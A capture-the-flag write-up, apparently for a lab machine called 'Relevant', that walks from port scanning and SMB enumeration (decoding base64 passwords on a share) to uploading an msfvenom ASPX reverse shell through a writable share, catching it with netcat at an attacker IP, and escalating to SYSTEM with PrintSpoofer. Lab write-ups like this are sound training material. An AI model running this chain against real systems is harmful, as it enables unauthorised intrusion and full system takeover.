# Revelant

## Recon
~~~
Firstly I ran Threader3000 to see what ports were open and followed up with a recommend nmap scan

Heres the results

------------------------------------------------------------
        Threader 3000 - Multi-threaded Port Scanner          
                       Version 1.0.7                    
                   A project by The Mayor               
------------------------------------------------------------
Enter your target IP address or URL here: 10.10.135.121
------------------------------------------------------------
Scanning target 10.10.135.121
Time started: 2022-10-06 19:31:45.126975
------------------------------------------------------------
Port 80 is open
Port 135 is open
Port 139 is open
Port 445 is open
Port 3389 is open
Port 49663 is open
Port 49666 is open
Port 49668 is open
Port scan completed in 0:01:47.473968
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p80,135,139,445,3389 -sV -sC -T4 -Pn -oA 10.10.135.121 10.10.135.121
************************************************************
Would you like to run Nmap or quit to terminal?
------------------------------------------------------------
1 = Run suggested Nmap scan
2 = Run another Threader3000 scan
3 = Exit to terminal
------------------------------------------------------------
Option Selection: 1
nmap -p80,135,139,445,3389 -sV -sC -T4 -Pn -oA 10.10.135.121 10.10.135.121
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-06 19:33 BST
Nmap scan report for 10.10.135.121
Host is up.

PORT     STATE    SERVICE       VERSION
80/tcp   filtered http
135/tcp  filtered msrpc
139/tcp  filtered netbios-ssn
445/tcp  filtered microsoft-ds
3389/tcp filtered ms-wbt-server

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.70 seconds
Segmentation fault
------------------------------------------------------------
Combined scan completed in 0:01:52.836743
~~~

# Enumeration
~~~
We can see SMB is open so we do a quick scan and see what we can find, firstly listing the avaliable sharenames

smbclient -L //10.10.135.121
Password for [WORKGROUP\sloppy]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk  

We can see the sharename nt4wrksv so lets see what is in it

sudo smbclient \\\\10.10.135.121\\nt4wrksv
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 22:46:04 2020
  ..                                  D        0  Sat Jul 25 22:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 16:15:33 2020

                7735807 blocks of size 4096. 5142252 blocks available
smb: \> more password.txt
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk

As these are encoded lets decode them(they look like base64)

echo 'Qm9iIC0gIVBAJCRXMHJEITEyMw==' | base64 -d
Bob - !P@$$W0rD!123

echo 'QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk' | base64 -d
Bill - Juw4nnaM4n420696969!$$$  

Upon futher Manual Enumeration these are found to be useless credentials

So as we can see after a gobuster on port 80 webserver we retrieve nothing, however there is another webserver on port 49663, after running a gobuster we reveal a useful page 

To save you time, use the 2.3 medium list , however it does take awhile to find it is there.

grep nt4wrksv directory-list-2.3-medium.txt 
nt4wrksv

As we notice this is the same as the SMB share lets try one of the files we can see

http://10.10.135.121:49663/nt4wrksv/passwords.txt (this displays the results)

Now that we know that the webserver is the sharename lets input a POC txt document.

echo 'HELLO' > test.txt

sudo smbclient \\\\10.10.135.121\\nt4wrksv
smb: \> put test.txt
putting file test.txt as \test.txt (0.1 kb/s) (average 0.1 kb/s)

http://10.10.135.121:49663/nt4wrksv/test.txt
Hello
~~~

## Exploitation
~~~
And as we know this works now, lets get a reverse shell and upload it. I use the link below to build it

https://pentest.ws/tools/venom-builder

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.91.23 LPORT=53 -f aspx -o rev.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3438 bytes
Saved as: rev.aspx

sudo smbclient \\\\10.10.135.121\\nt4wrksv
smb: \> put rev.aspx
putting file rev.aspx as \rev.aspx (28.2 kb/s) (average 28.2 kb/s)

start a reverse listener on attacker pc and run the rev on the webserver

http://10.10.135.121:49663/nt4wrksv/rev.aspx

sudo nc -lvnp 53
listening on [any] 53 ...
connect to [10.18.91.23] from (UNKNOWN) [10.10.12.44] 49737
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool

As we know this is manual first lets not try winpeas lets check whoami /priv

c:\windows\system32\inetsrv> whoami /priv
 whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

c:\windows\system32\inetsrv>

We can see that Impersonate is enabled lets exploit this

Printspoofer.exe
https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe

Once you have put this on the SMB client lets find that on the shell and run it

cd c:\inetpub\wwwroot\nt4wrksv

c:\inetpub\wwwroot\nt4wrksv>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\inetpub\wwwroot\nt4wrksv

10/06/2022  12:39 PM    <DIR>          .
10/06/2022  12:39 PM    <DIR>          ..
07/25/2020  08:15 AM                98 passwords.txt
10/06/2022  12:35 PM           136,092 PrintSpoofer.exe
10/06/2022  12:40 PM            27,136 PrintSpoofer64.exe
10/06/2022  12:30 PM             3,438 rev.aspx
               4 File(s)        166,764 bytes
               2 Dir(s)  20,524,376,064 bytes free

c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer64.exe -i -c cmd
PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

Now find the flags!!!
~~~